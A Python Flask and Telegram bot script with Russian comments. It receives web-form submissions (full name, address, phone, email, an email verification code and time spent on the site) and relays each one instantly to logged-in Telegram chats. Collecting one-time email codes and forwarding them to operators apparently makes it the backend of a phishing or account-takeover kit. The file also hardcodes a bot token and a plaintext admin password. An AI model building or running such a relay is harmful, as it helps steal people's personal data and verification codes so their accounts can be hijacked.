import json
import os
from threading import Thread
from flask import Flask, request, jsonify
from flask_cors import CORS
import telebot

BOT_TOKEN = "8809641832:AAGYRF4EdDcHVE3hm3CXIzOPnuvPUojGOC4"  # Вставьте токен от @BotFather
bot = telebot.TeleBot(BOT_TOKEN)

# Допустимые логины и пароли
ALLOWED_ACCOUNTS = {
    "admin": "merlnv",
}

AUTH_FILE = "authorized_chats.json"

def load_authorized_chats():
    if os.path.exists(AUTH_FILE):
        with open(AUTH_FILE, "r", encoding="utf-8") as f:
            return set(json.load(f))
    return set()

def save_authorized_chats(chats):
    with open(AUTH_FILE, "w", encoding="utf-8") as f:
        json.dump(list(chats), f, ensure_ascii=False, indent=2)

authorized_chats = load_authorized_chats()

# 1. Ответ на команду /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(
        message, 
        "👋 Здравствуйте!\n\nДля получения уведомлений о заявках введите логин и пароль в формате:\n`/login логин пароль`", 
        parse_mode="Markdown"
    )

# 2. Авторизация пользователей
@bot.message_handler(commands=['login'])
def handle_login(message):
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Использование: `/login логин пароль`", parse_mode="Markdown")
            return
        
        login_input, pass_input = parts[1], parts[2]
        
        if ALLOWED_ACCOUNTS.get(login_input) == pass_input:
            authorized_chats.add(message.chat.id)
            save_authorized_chats(authorized_chats)
            bot.reply_to(message, "✅ Авторизация успешна! Вы будете получать все новые заявки.")
        else:
            bot.reply_to(message, "❌ Ошибка: неверный логин или пароль.")
    except Exception:
        bot.reply_to(message, "Произошла ошибка при обработке команды.")

app = Flask(__name__)
CORS(app)

# 3. Прием данных от формы
@app.route('/api/lead', methods=['POST'])
def receive_lead():
    data = request.json or {}
    
    # Проверка обязательных полей (код теперь НЕ обязателен)
    required_fields = ['fullName', 'address', 'phone', 'email']
    for field in required_fields:
        if not data.get(field) or str(data.get(field)).strip() == '':
            return jsonify({'status': 'error', 'message': f'Поле {field} обязательное'}), 400

    otp_display = data.get('otpCode') if data.get('otpCode') else "Не введен"

    message_text = (
        f"🔔 *Новая заявка на регистрацию*\n\n"
        f"👤 *ФИО:* {data['fullName']}\n"
        f"🏠 *Адрес:* {data['address']}\n"
        f"📞 *Телефон:* {data['phone']}\n"
        f"📧 *Email:* {data['email']}\n"
        f"🔑 *Код E-mail:* {otp_display}\n"
        f"⏱ *Время на сайте:* {data.get('timeSpent', 'Н/Д')}"
    )

    # Мгновенная рассылка авторизованным юзерам
    for chat_id in list(authorized_chats):
        try:
            bot.send_message(chat_id, message_text, parse_mode="Markdown")
        except Exception as e:
            print(f"Ошибка отправки пользователю {chat_id}: {e}")

    return jsonify({'status': 'success'}), 200

def run_flask():
    app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    print("🚀 Сервер запущен на порту 5000...")
    bot.infinity_polling()